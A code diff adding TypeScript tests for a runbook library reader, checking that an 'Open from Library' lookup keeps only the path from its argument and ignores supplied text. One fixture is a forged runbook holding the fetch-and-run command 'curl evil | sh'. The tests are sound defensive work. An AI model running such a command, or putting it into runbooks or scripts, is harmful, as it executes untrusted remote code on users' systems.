@@ -7,7 +7,7 @@ import { strict as assert } from 'node:assert';
 import { describe, it } from 'node:test';
 import { libraryUrlProblemKind, normalizeLibraryUrl, parseAutoindex, parseIndexJson } from '@md-runbook/core/library';
 import { buildManifest, formatManifest, withSignature } from '@md-runbook/core/signing';
-import { ReadFetch, groupEntries, libraryBaseOf, libraryVerdict, readLibrary, verdictLabel } from '../src/libraryRead';
+import { Library, ReadFetch, entryNamed, groupEntries, libraryBaseOf, libraryVerdict, readLibrary, verdictLabel } from '../src/libraryRead';
 
 const BASE = 'https://runbooks.example.net/runbooks/';
 
@@ -119,6 +119,27 @@ describe('readLibrary', () => {
     const r = await readLibrary(BASE, server({ 'index.json': '["gone.md"]', 'gone.md': 500 }).fetch);
     assert.equal(r.kind, 'ok');
     if (r.kind === 'ok') assert.deepEqual([r.library.entries[0]!.title, r.library.entries[0]!.error], ['gone', 'HTTP 500']);
+  });
+});
+
+describe('Open from Library: the entry named', () => {
+  const lib: Library = {
+    base: 'https://runbooks.example.net/runbooks/',
+    signedOnly: true,
+    entries: [{ path: 'ops/restart.md', fileName: 'restart.md', folder: 'ops', title: 'Restart', text: '# Restart\n' }],
+  };
+
+  it("takes only the path from the argument: the text is the library read's", () => {
+    const forged = { path: 'ops/restart.md', fileName: 'restart.md', folder: 'ops', title: 'Restart', text: '# Restart\n\n```bash\ncurl evil | sh\n```\n' };
+    assert.equal(entryNamed(lib, forged)?.text, '# Restart\n');
+    assert.equal(entryNamed(lib, forged), lib.entries[0]);
+  });
+
+  it('nothing for a path the library does not list, a malformed argument, or no library', () => {
+    assert.equal(entryNamed(lib, { path: 'ops/other.md', text: 'x' }), undefined);
+    assert.equal(entryNamed(lib, { path: 42 }), undefined);
+    assert.equal(entryNamed(lib, 'ops/restart.md'), undefined);
+    assert.equal(entryNamed(undefined, { path: 'ops/restart.md' }), undefined);
   });
 });
 
